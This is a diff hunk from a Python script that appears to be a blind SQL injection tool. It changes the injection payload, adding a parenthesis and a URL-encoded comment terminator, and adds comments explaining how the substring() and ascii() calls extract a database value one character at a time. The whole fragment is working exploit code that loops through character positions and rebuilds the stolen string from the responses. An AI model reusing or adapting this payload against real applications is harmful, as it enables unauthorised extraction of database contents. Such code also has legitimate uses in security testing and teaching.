@@ -63,7 +63,9 @@ def inject(r, inj):
     extracted = ""
     for i in range(1, r):
         # modify injection_string based on the vulnerable endpoint requirements
-        injection_string = f"test'/**/or/**/(ascii(substring(({inj}),{i},1)))=[CHAR]/**/or/**/1='"
+        # substring() and dynamic param used to test for each single character, wrapped in ascii() to return the ascii int val,
+        # then [CHAR] is substituted to each ascii printable character in prepare_sqli_request()
+        injection_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))=[CHAR]%23"
         retrieved_value = prepare_sqli_request(injection_string)
         if (retrieved_value):
             extracted += chr(retrieved_value)
